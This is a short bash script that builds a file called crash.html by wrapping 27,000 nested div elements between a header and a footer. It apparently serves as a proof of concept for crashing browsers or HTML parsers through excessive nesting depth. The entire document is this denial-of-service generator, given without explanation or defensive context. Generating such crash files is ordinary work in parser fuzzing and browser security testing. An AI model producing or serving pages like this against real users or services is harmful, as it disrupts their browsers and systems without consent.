#!/bin/bash
LOOP=27000
cat header > crash.html; for i in `seq $LOOP`; do echo -n '<div>' >> crash.html; done; for i in `seq $LOOP`; do echo -n '</div>' >> crash.html; done; cat footer >> crash.html
